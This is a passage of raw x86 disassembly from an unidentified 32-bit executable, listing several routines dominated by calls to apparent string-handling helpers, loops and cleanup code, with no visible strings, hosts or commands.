  401784:	ba 36 70 41 00       	mov    $0x417036,%edx
  401789:	59                   	pop    %ecx
  40178a:	51                   	push   %ecx
  40178b:	e8 d0 39 00 00       	call   0x405160
  401790:	89 c1                	mov    %eax,%ecx
  401792:	e8 89 39 00 00       	call   0x405120
  401797:	0f 84 b4 00 00 00    	je     0x401851
  40179d:	8b 15 50 80 41 00    	mov    0x418050,%edx
  4017a3:	52                   	push   %edx
  4017a4:	e8 d7 c6 00 00       	call   0x40de80
  4017a9:	5a                   	pop    %edx
  4017aa:	50                   	push   %eax
  4017ab:	52                   	push   %edx
  4017ac:	e8 6f c8 00 00       	call   0x40e020
  4017b1:	8b 15 6c 80 41 00    	mov    0x41806c,%edx
  4017b7:	52                   	push   %edx
  4017b8:	e8 63 c8 00 00       	call   0x40e020
  4017bd:	52                   	push   %edx
  4017be:	e8 bd c6 00 00       	call   0x40de80
  4017c3:	5a                   	pop    %edx
  4017c4:	50                   	push   %eax
  4017c5:	52                   	push   %edx
  4017c6:	e8 b5 c6 00 00       	call   0x40de80
  4017cb:	5a                   	pop    %edx
  4017cc:	50                   	push   %eax
  4017cd:	b8 36 70 41 00       	mov    $0x417036,%eax
  4017d2:	50                   	push   %eax
  4017d3:	ff 74 24 20          	push   0x20(%esp)
  4017d7:	e8 c4 45 00 00       	call   0x405da0
  4017dc:	58                   	pop    %eax
  4017dd:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4017e1:	50                   	push   %eax
  4017e2:	e8 d9 c6 00 00       	call   0x40dec0
  4017e7:	ff 74 24 28          	push   0x28(%esp)
  4017eb:	e8 d5 8e 00 00       	call   0x40a6c5
  4017f0:	8b 1d 84 80 41 00    	mov    0x418084,%ebx
  4017f6:	83 fb 01             	cmp    $0x1,%ebx
  4017f9:	75 13                	jne    0x40180e
  4017fb:	ff 74 24 24          	push   0x24(%esp)
  4017ff:	e8 dc 41 00 00       	call   0x4059e0
  401804:	50                   	push   %eax
  401805:	ff 74 24 2c          	push   0x2c(%esp)
  401809:	e8 37 8f 00 00       	call   0x40a745
  40180e:	ff 74 24 28          	push   0x28(%esp)
  401812:	e8 27 24 00 00       	call   0x403c3e
  401817:	8b 15 90 80 41 00    	mov    0x418090,%edx
  40181d:	52                   	push   %edx
  40181e:	e8 5d c6 00 00       	call   0x40de80
  401823:	5a                   	pop    %edx
  401824:	50                   	push   %eax
  401825:	52                   	push   %edx
  401826:	e8 f5 c7 00 00       	call   0x40e020
  40182b:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  40182f:	52                   	push   %edx
  401830:	e8 eb c7 00 00       	call   0x40e020
  401835:	ba 66 70 41 00       	mov    $0x417066,%edx
  40183a:	52                   	push   %edx
  40183b:	e8 e0 c7 00 00       	call   0x40e020
  401840:	8d 05 90 80 41 00    	lea    0x418090,%eax
  401846:	50                   	push   %eax
  401847:	e8 74 c6 00 00       	call   0x40dec0
  40184c:	e9 bd 00 00 00       	jmp    0x40190e
  401851:	52                   	push   %edx
  401852:	e8 29 c6 00 00       	call   0x40de80
  401857:	5a                   	pop    %edx
  401858:	50                   	push   %eax
  401859:	52                   	push   %edx
  40185a:	e8 21 c6 00 00       	call   0x40de80
  40185f:	5a                   	pop    %edx
  401860:	50                   	push   %eax
  401861:	b8 36 70 41 00       	mov    $0x417036,%eax
  401866:	50                   	push   %eax
  401867:	ff 74 24 1c          	push   0x1c(%esp)
  40186b:	e8 30 45 00 00       	call   0x405da0
  401870:	8d 44 24 14          	lea    0x14(%esp),%eax
  401874:	50                   	push   %eax
  401875:	e8 46 c6 00 00       	call   0x40dec0
  40187a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40187e:	52                   	push   %edx
  40187f:	e8 fc c5 00 00       	call   0x40de80
  401884:	5a                   	pop    %edx
  401885:	50                   	push   %eax
  401886:	52                   	push   %edx
  401887:	e8 94 c7 00 00       	call   0x40e020
  40188c:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401890:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  401896:	6b db 0c             	imul   $0xc,%ebx,%ebx
  401899:	01 dd                	add    %ebx,%ebp
  40189b:	8d 45 04             	lea    0x4(%ebp),%eax
  40189e:	50                   	push   %eax
  40189f:	e8 1c c6 00 00       	call   0x40dec0
  4018a4:	ff 74 24 24          	push   0x24(%esp)
  4018a8:	e8 33 41 00 00       	call   0x4059e0
  4018ad:	50                   	push   %eax
  4018ae:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4018b2:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  4018b8:	6b db 0c             	imul   $0xc,%ebx,%ebx
  4018bb:	01 dd                	add    %ebx,%ebp
  4018bd:	58                   	pop    %eax
  4018be:	89 45 00             	mov    %eax,0x0(%ebp)
  4018c1:	8b 15 90 80 41 00    	mov    0x418090,%edx
  4018c7:	52                   	push   %edx
  4018c8:	e8 b3 c5 00 00       	call   0x40de80
  4018cd:	5a                   	pop    %edx
  4018ce:	50                   	push   %eax
  4018cf:	52                   	push   %edx
  4018d0:	e8 4b c7 00 00       	call   0x40e020
  4018d5:	8b 15 50 80 41 00    	mov    0x418050,%edx
  4018db:	52                   	push   %edx
  4018dc:	e8 3f c7 00 00       	call   0x40e020
  4018e1:	8b 15 6c 80 41 00    	mov    0x41806c,%edx
  4018e7:	52                   	push   %edx
  4018e8:	e8 33 c7 00 00       	call   0x40e020
  4018ed:	8b 54 24 14          	mov    0x14(%esp),%edx
  4018f1:	52                   	push   %edx
  4018f2:	e8 29 c7 00 00       	call   0x40e020
  4018f7:	ba 66 70 41 00       	mov    $0x417066,%edx
  4018fc:	52                   	push   %edx
  4018fd:	e8 1e c7 00 00       	call   0x40e020
  401902:	8d 05 90 80 41 00    	lea    0x418090,%eax
  401908:	50                   	push   %eax
  401909:	e8 b2 c5 00 00       	call   0x40dec0
  40190e:	eb 02                	jmp    0x401912
  401910:	eb 0e                	jmp    0x401920
  401912:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401916:	43                   	inc    %ebx
  401917:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40191b:	e9 4c fd ff ff       	jmp    0x40166c
  401920:	8b 44 24 04          	mov    0x4(%esp),%eax
  401924:	eb 02                	jmp    0x401928
  401926:	31 c0                	xor    %eax,%eax
  401928:	ff 74 24 08          	push   0x8(%esp)
  40192c:	e8 1f c6 00 00       	call   0x40df50
  401931:	ff 74 24 28          	push   0x28(%esp)
  401935:	e8 16 c6 00 00       	call   0x40df50
  40193a:	ff 74 24 10          	push   0x10(%esp)
  40193e:	e8 0d c6 00 00       	call   0x40df50
  401943:	ff 74 24 24          	push   0x24(%esp)
  401947:	e8 04 c6 00 00       	call   0x40df50
  40194c:	ff 74 24 0c          	push   0xc(%esp)
  401950:	e8 fb c5 00 00       	call   0x40df50
  401955:	83 c4 2c             	add    $0x2c,%esp
  401958:	5b                   	pop    %ebx
  401959:	5d                   	pop    %ebp
  40195a:	c3                   	ret
  40195b:	53                   	push   %ebx
  40195c:	31 c0                	xor    %eax,%eax
  40195e:	50                   	push   %eax
  40195f:	50                   	push   %eax
  401960:	50                   	push   %eax
  401961:	50                   	push   %eax
  401962:	50                   	push   %eax
  401963:	50                   	push   %eax
  401964:	e8 57 c6 00 00       	call   0x40dfc0
  401969:	b8 0b 71 41 00       	mov    $0x41710b,%eax
  40196e:	a3 34 80 41 00       	mov    %eax,0x418034
  401973:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40197a:	eb 00                	jmp    0x40197c
  40197c:	b8 03 00 00 00       	mov    $0x3,%eax
  401981:	3b 04 24             	cmp    (%esp),%eax
  401984:	7c 64                	jl     0x4019ea
  401986:	a1 34 80 41 00       	mov    0x418034,%eax
  40198b:	0f be 00             	movsbl (%eax),%eax
  40198e:	89 44 24 04          	mov    %eax,0x4(%esp)
  401992:	ff 05 34 80 41 00    	incl   0x418034
  401998:	52                   	push   %edx
  401999:	e8 e2 c4 00 00       	call   0x40de80
  40199e:	5a                   	pop    %edx
  40199f:	50                   	push   %eax
  4019a0:	52                   	push   %edx
  4019a1:	e8 da c4 00 00       	call   0x40de80
  4019a6:	5a                   	pop    %edx
  4019a7:	50                   	push   %eax
  4019a8:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4019ac:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  4019af:	53                   	push   %ebx
  4019b0:	e8 0b 44 00 00       	call   0x405dc0
  4019b5:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4019b9:	50                   	push   %eax
  4019ba:	e8 01 c5 00 00       	call   0x40dec0
  4019bf:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4019c3:	52                   	push   %edx
  4019c4:	e8 b7 c4 00 00       	call   0x40de80
  4019c9:	5a                   	pop    %edx
  4019ca:	50                   	push   %eax
  4019cb:	52                   	push   %edx
  4019cc:	e8 4f c6 00 00       	call   0x40e020
  4019d1:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4019d5:	52                   	push   %edx
  4019d6:	e8 45 c6 00 00       	call   0x40e020
  4019db:	8d 44 24 10          	lea    0x10(%esp),%eax
  4019df:	50                   	push   %eax
  4019e0:	e8 db c4 00 00       	call   0x40dec0
  4019e5:	ff 04 24             	incl   (%esp)
  4019e8:	71 92                	jno    0x40197c
  4019ea:	68 00 04 00 00       	push   $0x400
  4019ef:	e8 ac 81 00 00       	call   0x409ba0
  4019f4:	89 44 24 10          	mov    %eax,0x10(%esp)
  4019f8:	52                   	push   %edx
  4019f9:	e8 82 c4 00 00       	call   0x40de80
  4019fe:	5a                   	pop    %edx
  4019ff:	50                   	push   %eax
  401a00:	52                   	push   %edx
  401a01:	e8 7a c4 00 00       	call   0x40de80
  401a06:	5a                   	pop    %edx
  401a07:	50                   	push   %eax
  401a08:	e8 49 8d 00 00       	call   0x40a756
  401a0d:	8d 44 24 18          	lea    0x18(%esp),%eax
  401a11:	50                   	push   %eax
  401a12:	e8 a9 c4 00 00       	call   0x40dec0
  401a17:	ff 74 24 10          	push   0x10(%esp)
  401a1b:	68 00 00 00 00       	push   $0x0
  401a20:	b8 24 70 41 00       	mov    $0x417024,%eax
  401a25:	50                   	push   %eax
  401a26:	ff 74 24 20          	push   0x20(%esp)
  401a2a:	e8 6b 36 00 00       	call   0x40509a
  401a2f:	52                   	push   %edx
  401a30:	e8 4b c4 00 00       	call   0x40de80
  401a35:	5a                   	pop    %edx
  401a36:	50                   	push   %eax
  401a37:	52                   	push   %edx
  401a38:	e8 43 c4 00 00       	call   0x40de80
  401a3d:	5a                   	pop    %edx
  401a3e:	50                   	push   %eax
  401a3f:	ff 74 24 18          	push   0x18(%esp)
  401a43:	e8 78 81 00 00       	call   0x409bc0
  401a48:	8d 05 78 80 41 00    	lea    0x418078,%eax
  401a4e:	50                   	push   %eax
  401a4f:	e8 6c c4 00 00       	call   0x40dec0
  401a54:	ff 35 78 80 41 00    	push   0x418078
  401a5a:	e8 88 8d 00 00       	call   0x40a7e7
  401a5f:	ff 35 78 80 41 00    	push   0x418078
  401a65:	e8 5b 8c 00 00       	call   0x40a6c5
  401a6a:	ff 74 24 10          	push   0x10(%esp)
  401a6e:	68 00 00 00 00       	push   $0x0
  401a73:	b8 24 70 41 00       	mov    $0x417024,%eax
  401a78:	50                   	push   %eax
  401a79:	ff 35 78 80 41 00    	push   0x418078
  401a7f:	e8 16 36 00 00       	call   0x40509a
  401a84:	52                   	push   %edx
  401a85:	e8 f6 c3 00 00       	call   0x40de80
  401a8a:	5a                   	pop    %edx
  401a8b:	50                   	push   %eax
  401a8c:	52                   	push   %edx
  401a8d:	e8 ee c3 00 00       	call   0x40de80
  401a92:	5a                   	pop    %edx
  401a93:	50                   	push   %eax
  401a94:	ff 74 24 18          	push   0x18(%esp)
  401a98:	e8 23 81 00 00       	call   0x409bc0
  401a9d:	8d 05 2c 80 41 00    	lea    0x41802c,%eax
  401aa3:	50                   	push   %eax
  401aa4:	e8 17 c4 00 00       	call   0x40dec0
  401aa9:	ff 35 2c 80 41 00    	push   0x41802c
  401aaf:	e8 33 8d 00 00       	call   0x40a7e7
  401ab4:	ff 35 2c 80 41 00    	push   0x41802c
  401aba:	e8 06 8c 00 00       	call   0x40a6c5
  401abf:	ff 74 24 10          	push   0x10(%esp)
  401ac3:	68 00 00 00 00       	push   $0x0
  401ac8:	b8 24 70 41 00       	mov    $0x417024,%eax
  401acd:	50                   	push   %eax
  401ace:	ff 35 2c 80 41 00    	push   0x41802c
  401ad4:	e8 c1 35 00 00       	call   0x40509a
  401ad9:	ff 35 2c 80 41 00    	push   0x41802c
  401adf:	e8 77 38 00 00       	call   0x40535b
  401ae4:	52                   	push   %edx
  401ae5:	e8 96 c3 00 00       	call   0x40de80
  401aea:	5a                   	pop    %edx
  401aeb:	50                   	push   %eax
  401aec:	52                   	push   %edx
  401aed:	e8 8e c3 00 00       	call   0x40de80
  401af2:	5a                   	pop    %edx
  401af3:	50                   	push   %eax
  401af4:	ff 74 24 18          	push   0x18(%esp)
  401af8:	e8 c3 80 00 00       	call   0x409bc0
  401afd:	8d 05 40 80 41 00    	lea    0x418040,%eax
  401b03:	50                   	push   %eax
  401b04:	e8 b7 c3 00 00       	call   0x40dec0
  401b09:	ff 35 40 80 41 00    	push   0x418040
  401b0f:	e8 d3 8c 00 00       	call   0x40a7e7
  401b14:	ff 74 24 0c          	push   0xc(%esp)
  401b18:	ff 35 40 80 41 00    	push   0x418040
  401b1e:	e8 3e 38 00 00       	call   0x405361
  401b23:	ff 74 24 10          	push   0x10(%esp)
  401b27:	68 00 00 00 00       	push   $0x0
  401b2c:	b8 24 70 41 00       	mov    $0x417024,%eax
  401b31:	50                   	push   %eax
  401b32:	ff 35 2c 80 41 00    	push   0x41802c
  401b38:	e8 5d 35 00 00       	call   0x40509a
  401b3d:	52                   	push   %edx
  401b3e:	e8 3d c3 00 00       	call   0x40de80
  401b43:	5a                   	pop    %edx
  401b44:	50                   	push   %eax
  401b45:	52                   	push   %edx
  401b46:	e8 35 c3 00 00       	call   0x40de80
  401b4b:	5a                   	pop    %edx
  401b4c:	50                   	push   %eax
  401b4d:	ff 74 24 18          	push   0x18(%esp)
  401b51:	e8 6a 80 00 00       	call   0x409bc0
  401b56:	8d 05 70 80 41 00    	lea    0x418070,%eax
  401b5c:	50                   	push   %eax
  401b5d:	e8 5e c3 00 00       	call   0x40dec0
  401b62:	ff 74 24 10          	push   0x10(%esp)
  401b66:	e8 15 80 00 00       	call   0x409b80
  401b6b:	eb 02                	jmp    0x401b6f
  401b6d:	31 c0                	xor    %eax,%eax
  401b6f:	ff 74 24 14          	push   0x14(%esp)
  401b73:	e8 d8 c3 00 00       	call   0x40df50
  401b78:	ff 74 24 08          	push   0x8(%esp)
  401b7c:	e8 cf c3 00 00       	call   0x40df50
  401b81:	ff 74 24 0c          	push   0xc(%esp)
  401b85:	e8 c6 c3 00 00       	call   0x40df50
  401b8a:	83 c4 18             	add    $0x18,%esp
  401b8d:	5b                   	pop    %ebx
  401b8e:	c3                   	ret
  401b8f:	55                   	push   %ebp
  401b90:	53                   	push   %ebx
  401b91:	31 c0                	xor    %eax,%eax
  401b93:	50                   	push   %eax
  401b94:	50                   	push   %eax
  401b95:	50                   	push   %eax
  401b96:	50                   	push   %eax
  401b97:	50                   	push   %eax
  401b98:	50                   	push   %eax
  401b99:	e8 22 c4 00 00       	call   0x40dfc0
  401b9e:	52                   	push   %edx
  401b9f:	e8 dc c2 00 00       	call   0x40de80
  401ba4:	5a                   	pop    %edx
  401ba5:	50                   	push   %eax
  401ba6:	68 02 00 00 00       	push   $0x2
  401bab:	68 00 00 00 00       	push   $0x0
  401bb0:	52                   	push   %edx
  401bb1:	e8 ca c2 00 00       	call   0x40de80
  401bb6:	5a                   	pop    %edx
  401bb7:	50                   	push   %eax
  401bb8:	52                   	push   %edx
  401bb9:	e8 c2 c2 00 00       	call   0x40de80
  401bbe:	5a                   	pop    %edx
  401bbf:	50                   	push   %eax
  401bc0:	e8 d3 7a 00 00       	call   0x409698
  401bc5:	e8 b8 35 00 00       	call   0x405182
  401bca:	01 14 24             	add    %edx,(%esp)
  401bcd:	e8 ce 34 00 00       	call   0x4050a0
  401bd2:	e8 c9 35 00 00       	call   0x4051a0
  401bd7:	89 04 24             	mov    %eax,(%esp)
  401bda:	68 00 00 00 00       	push   $0x0
  401bdf:	8d 05 09 21 40 00    	lea    0x402109,%eax
  401be5:	50                   	push   %eax
  401be6:	ff 74 24 08          	push   0x8(%esp)
  401bea:	e8 b7 34 00 00       	call   0x4050a6
  401bef:	ff 34 24             	push   (%esp)
  401bf2:	e8 b5 34 00 00       	call   0x4050ac
  401bf7:	ff 35 b0 80 41 00    	push   0x4180b0
  401bfd:	e8 41 88 00 00       	call   0x40a443
  401c02:	89 c3                	mov    %eax,%ebx
  401c04:	21 db                	and    %ebx,%ebx
  401c06:	0f 8e 0f 02 00 00    	jle    0x401e1b
  401c0c:	ff 35 b0 80 41 00    	push   0x4180b0
  401c12:	e8 36 88 00 00       	call   0x40a44d
  401c17:	ff 35 b0 80 41 00    	push   0x4180b0
  401c1d:	e8 40 88 00 00       	call   0x40a462
  401c22:	09 c0                	or     %eax,%eax
  401c24:	74 7a                	je     0x401ca0
  401c26:	8b 2d b4 80 41 00    	mov    0x4180b4,%ebp
  401c2c:	8b 55 08             	mov    0x8(%ebp),%edx
  401c2f:	52                   	push   %edx
  401c30:	e8 4b c2 00 00       	call   0x40de80
  401c35:	5a                   	pop    %edx
  401c36:	50                   	push   %eax
  401c37:	52                   	push   %edx
  401c38:	e8 e3 c3 00 00       	call   0x40e020
  401c3d:	8d 44 24 08          	lea    0x8(%esp),%eax
  401c41:	50                   	push   %eax
  401c42:	e8 79 c2 00 00       	call   0x40dec0
  401c47:	ff 74 24 04          	push   0x4(%esp)
  401c4b:	e8 90 41 00 00       	call   0x405de0
  401c50:	89 c3                	mov    %eax,%ebx
  401c52:	83 fb 0a             	cmp    $0xa,%ebx
  401c55:	7e 28                	jle    0x401c7f
  401c57:	8b 54 24 08          	mov    0x8(%esp),%edx
  401c5b:	52                   	push   %edx
  401c5c:	e8 1f c2 00 00       	call   0x40de80
  401c61:	5a                   	pop    %edx
  401c62:	50                   	push   %eax
  401c63:	52                   	push   %edx
  401c64:	e8 b7 c3 00 00       	call   0x40e020
  401c69:	8b 54 24 08          	mov    0x8(%esp),%edx
  401c6d:	52                   	push   %edx
  401c6e:	e8 ad c3 00 00       	call   0x40e020
  401c73:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401c77:	50                   	push   %eax
  401c78:	e8 43 c2 00 00       	call   0x40dec0
  401c7d:	eb 1c                	jmp    0x401c9b
  401c7f:	8b 54 24 04          	mov    0x4(%esp),%edx
  401c83:	52                   	push   %edx
  401c84:	e8 f7 c1 00 00       	call   0x40de80
  401c89:	5a                   	pop    %edx
  401c8a:	50                   	push   %eax
  401c8b:	52                   	push   %edx
  401c8c:	e8 8f c3 00 00       	call   0x40e020
  401c91:	8d 44 24 10          	lea    0x10(%esp),%eax
  401c95:	50                   	push   %eax
  401c96:	e8 25 c2 00 00       	call   0x40dec0
  401c9b:	e9 77 ff ff ff       	jmp    0x401c17
  401ca0:	ff 35 b0 80 41 00    	push   0x4180b0
  401ca6:	e8 eb 87 00 00       	call   0x40a496
  401cab:	52                   	push   %edx
  401cac:	e8 cf c1 00 00       	call   0x40de80
  401cb1:	5a                   	pop    %edx
  401cb2:	50                   	push   %eax
  401cb3:	52                   	push   %edx
  401cb4:	e8 c7 c1 00 00       	call   0x40de80
  401cb9:	5a                   	pop    %edx
  401cba:	50                   	push   %eax
  401cbb:	52                   	push   %edx
  401cbc:	e8 bf c1 00 00       	call   0x40de80
  401cc1:	5a                   	pop    %edx
  401cc2:	50                   	push   %eax
  401cc3:	52                   	push   %edx
  401cc4:	e8 b7 c1 00 00       	call   0x40de80
  401cc9:	5a                   	pop    %edx
  401cca:	50                   	push   %eax
  401ccb:	68 01 00 00 00       	push   $0x1
  401cd0:	52                   	push   %edx
  401cd1:	e8 aa c1 00 00       	call   0x40de80
  401cd6:	5a                   	pop    %edx
  401cd7:	50                   	push   %eax
  401cd8:	52                   	push   %edx
  401cd9:	e8 a2 c1 00 00       	call   0x40de80
  401cde:	5a                   	pop    %edx
  401cdf:	50                   	push   %eax
  401ce0:	ff 74 24 24          	push   0x24(%esp)
  401ce4:	e8 27 41 00 00       	call   0x405e10
  401ce9:	e8 94 34 00 00       	call   0x405182
  401cee:	01 14 24             	add    %edx,(%esp)
  401cf1:	e8 0a b4 00 00       	call   0x40d100
  401cf6:	e8 87 34 00 00       	call   0x405182
  401cfb:	01 14 24             	add    %edx,(%esp)
  401cfe:	e8 ad 41 00 00       	call   0x405eb0
  401d03:	8d 44 24 14          	lea    0x14(%esp),%eax
  401d07:	50                   	push   %eax
  401d08:	e8 b3 c1 00 00       	call   0x40dec0
  401d0d:	8b 54 24 10          	mov    0x10(%esp),%edx
  401d11:	52                   	push   %edx
  401d12:	e8 69 c1 00 00       	call   0x40de80
  401d17:	5a                   	pop    %edx
  401d18:	50                   	push   %eax
  401d19:	52                   	push   %edx
  401d1a:	e8 01 c3 00 00       	call   0x40e020
  401d1f:	8d 44 24 18          	lea    0x18(%esp),%eax
  401d23:	50                   	push   %eax
  401d24:	e8 97 c1 00 00       	call   0x40dec0
  401d29:	52                   	push   %edx
  401d2a:	e8 51 c1 00 00       	call   0x40de80
  401d2f:	5a                   	pop    %edx
  401d30:	50                   	push   %eax
  401d31:	52                   	push   %edx
  401d32:	e8 49 c1 00 00       	call   0x40de80
  401d37:	5a                   	pop    %edx
  401d38:	50                   	push   %eax
  401d39:	52                   	push   %edx
  401d3a:	e8 41 c1 00 00       	call   0x40de80
  401d3f:	5a                   	pop    %edx
  401d40:	50                   	push   %eax
  401d41:	52                   	push   %edx
  401d42:	e8 39 c1 00 00       	call   0x40de80
  401d47:	5a                   	pop    %edx
  401d48:	50                   	push   %eax
  401d49:	68 01 00 00 00       	push   $0x1
  401d4e:	ff 74 24 24          	push   0x24(%esp)
  401d52:	e8 a9 b3 00 00       	call   0x40d100
  401d57:	e8 26 34 00 00       	call   0x405182
  401d5c:	01 14 24             	add    %edx,(%esp)
  401d5f:	e8 4c 41 00 00       	call   0x405eb0
  401d64:	8d 44 24 14          	lea    0x14(%esp),%eax
  401d68:	50                   	push   %eax
  401d69:	e8 52 c1 00 00       	call   0x40dec0
  401d6e:	52                   	push   %edx
  401d6f:	e8 0c c1 00 00       	call   0x40de80
  401d74:	5a                   	pop    %edx
  401d75:	50                   	push   %eax
  401d76:	52                   	push   %edx
  401d77:	e8 04 c1 00 00       	call   0x40de80
  401d7c:	5a                   	pop    %edx
  401d7d:	50                   	push   %eax
  401d7e:	68 0a 00 00 00       	push   $0xa
  401d83:	ff 74 24 1c          	push   0x1c(%esp)
  401d87:	e8 94 41 00 00       	call   0x405f20
  401d8c:	8d 44 24 14          	lea    0x14(%esp),%eax
  401d90:	50                   	push   %eax
  401d91:	e8 2a c1 00 00       	call   0x40dec0
  401d96:	ff 74 24 0c          	push   0xc(%esp)
  401d9a:	8b 54 24 14          	mov    0x14(%esp),%edx
  401d9e:	59                   	pop    %ecx
  401d9f:	e8 7c 33 00 00       	call   0x405120
  401da4:	74 70                	je     0x401e16
  401da6:	e8 b3 7a 00 00       	call   0x40985e
  401dab:	21 c0                	and    %eax,%eax
  401dad:	74 63                	je     0x401e12
  401daf:	52                   	push   %edx
  401db0:	e8 cb c0 00 00       	call   0x40de80
  401db5:	5a                   	pop    %edx
  401db6:	50                   	push   %eax
  401db7:	52                   	push   %edx
  401db8:	e8 c3 c0 00 00       	call   0x40de80
  401dbd:	5a                   	pop    %edx
  401dbe:	50                   	push   %eax
  401dbf:	68 00 00 00 00       	push   $0x0
  401dc4:	e8 a9 7a 00 00       	call   0x409872
  401dc9:	e8 b2 c2 00 00       	call   0x40e080
  401dce:	8b 54 24 18          	mov    0x18(%esp),%edx
  401dd2:	59                   	pop    %ecx
  401dd3:	51                   	push   %ecx
  401dd4:	e8 87 33 00 00       	call   0x405160
  401dd9:	89 c1                	mov    %eax,%ecx
  401ddb:	e8 40 33 00 00       	call   0x405120
  401de0:	74 30                	je     0x401e12
  401de2:	c7 05 58 80 41 00 01 	movl   $0x1,0x418058
  401de9:	00 00 00 
  401dec:	52                   	push   %edx
  401ded:	e8 8e c0 00 00       	call   0x40de80
  401df2:	5a                   	pop    %edx
  401df3:	50                   	push   %eax
  401df4:	52                   	push   %edx
  401df5:	e8 86 c0 00 00       	call   0x40de80
  401dfa:	5a                   	pop    %edx
  401dfb:	50                   	push   %eax
  401dfc:	68 01 00 00 00       	push   $0x1
  401e01:	e8 6c 7a 00 00       	call   0x409872
  401e06:	8d 05 28 80 41 00    	lea    0x418028,%eax
  401e0c:	50                   	push   %eax
  401e0d:	e8 ae c0 00 00       	call   0x40dec0
  401e12:	eb 0e                	jmp    0x401e22
  401e14:	eb 05                	jmp    0x401e1b
  401e16:	e9 85 f3 ff ff       	jmp    0x4011a0
  401e1b:	e9 80 f3 ff ff       	jmp    0x4011a0
  401e20:	31 c0                	xor    %eax,%eax
  401e22:	ff 74 24 04          	push   0x4(%esp)
  401e26:	e8 25 c1 00 00       	call   0x40df50
  401e2b:	ff 74 24 0c          	push   0xc(%esp)
  401e2f:	e8 1c c1 00 00       	call   0x40df50
  401e34:	ff 74 24 08          	push   0x8(%esp)
  401e38:	e8 13 c1 00 00       	call   0x40df50
  401e3d:	ff 74 24 14          	push   0x14(%esp)
  401e41:	e8 0a c1 00 00       	call   0x40df50
  401e46:	ff 74 24 10          	push   0x10(%esp)
  401e4a:	e8 01 c1 00 00       	call   0x40df50
  401e4f:	83 c4 18             	add    $0x18,%esp
  401e52:	5b                   	pop    %ebx
  401e53:	5d                   	pop    %ebp
  401e54:	c3                   	ret
  401e55:	53                   	push   %ebx
  401e56:	31 c0                	xor    %eax,%eax
  401e58:	50                   	push   %eax
  401e59:	50                   	push   %eax
  401e5a:	e8 61 c1 00 00       	call   0x40dfc0
  401e5f:	ff 74 24 14          	push   0x14(%esp)
  401e63:	e8 38 33 00 00       	call   0x4051a0
  401e68:	52                   	push   %edx
  401e69:	e8 12 c0 00 00       	call   0x40de80
  401e6e:	5a                   	pop    %edx
  401e6f:	50                   	push   %eax
  401e70:	52                   	push   %edx
  401e71:	e8 0a c0 00 00       	call   0x40de80
  401e76:	5a                   	pop    %edx
  401e77:	50                   	push   %eax
  401e78:	e8 1b 78 00 00       	call   0x409698
  401e7d:	8d 44 24 04          	lea    0x4(%esp),%eax
  401e81:	50                   	push   %eax
  401e82:	e8 39 c0 00 00       	call   0x40dec0
  401e87:	ff 34 24             	push   (%esp)
  401e8a:	e8 d8 34 00 00       	call   0x405367
  401e8f:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  401e93:	21 db                	and    %ebx,%ebx
  401e95:	7e 49                	jle    0x401ee0
  401e97:	52                   	push   %edx
  401e98:	e8 e3 bf 00 00       	call   0x40de80
  401e9d:	5a                   	pop    %edx
  401e9e:	50                   	push   %eax
  401e9f:	e8 4d 06 00 00       	call   0x4024f1
  401ea4:	8d 44 24 08          	lea    0x8(%esp),%eax
  401ea8:	50                   	push   %eax
  401ea9:	e8 12 c0 00 00       	call   0x40dec0
  401eae:	8b 14 24             	mov    (%esp),%edx
  401eb1:	52                   	push   %edx
  401eb2:	e8 c9 bf 00 00       	call   0x40de80
  401eb7:	5a                   	pop    %edx
  401eb8:	50                   	push   %eax
  401eb9:	52                   	push   %edx
  401eba:	e8 61 c1 00 00       	call   0x40e020
  401ebf:	ba 2a 70 41 00       	mov    $0x41702a,%edx
  401ec4:	52                   	push   %edx
  401ec5:	e8 56 c1 00 00       	call   0x40e020
  401eca:	8b 54 24 08          	mov    0x8(%esp),%edx
  401ece:	52                   	push   %edx
  401ecf:	e8 4c c1 00 00       	call   0x40e020
  401ed4:	8d 44 24 08          	lea    0x8(%esp),%eax
  401ed8:	50                   	push   %eax
  401ed9:	e8 e2 bf 00 00       	call   0x40dec0
  401ede:	eb 1b                	jmp    0x401efb
  401ee0:	8b 14 24             	mov    (%esp),%edx
  401ee3:	52                   	push   %edx
  401ee4:	e8 97 bf 00 00       	call   0x40de80
  401ee9:	5a                   	pop    %edx
  401eea:	50                   	push   %eax
  401eeb:	52                   	push   %edx
  401eec:	e8 2f c1 00 00       	call   0x40e020
  401ef1:	8d 44 24 08          	lea    0x8(%esp),%eax
  401ef5:	50                   	push   %eax
  401ef6:	e8 c5 bf 00 00       	call   0x40dec0
  401efb:	8b 54 24 04          	mov    0x4(%esp),%edx
  401eff:	52                   	push   %edx
  401f00:	e8 7b bf 00 00       	call   0x40de80
  401f05:	5a                   	pop    %edx
  401f06:	50                   	push   %eax
  401f07:	52                   	push   %edx
  401f08:	e8 13 c1 00 00       	call   0x40e020
  401f0d:	58                   	pop    %eax
  401f0e:	50                   	push   %eax
  401f0f:	e8 5c 32 00 00       	call   0x405170
  401f14:	5a                   	pop    %edx
  401f15:	01 d0                	add    %edx,%eax
  401f17:	eb 0a                	jmp    0x401f23
  401f19:	e8 92 c1 00 00       	call   0x40e0b0
  401f1e:	66 c7 00 00 00       	movw   $0x0,(%eax)
  401f23:	ff 34 24             	push   (%esp)
  401f26:	e8 25 c0 00 00       	call   0x40df50
  401f2b:	ff 74 24 04          	push   0x4(%esp)
  401f2f:	e8 1c c0 00 00       	call   0x40df50
  401f34:	83 c4 08             	add    $0x8,%esp
  401f37:	5b                   	pop    %ebx
  401f38:	c2 04 00             	ret    $0x4
  401f3b:	31 c0                	xor    %eax,%eax
  401f3d:	50                   	push   %eax
  401f3e:	e8 7d c0 00 00       	call   0x40dfc0
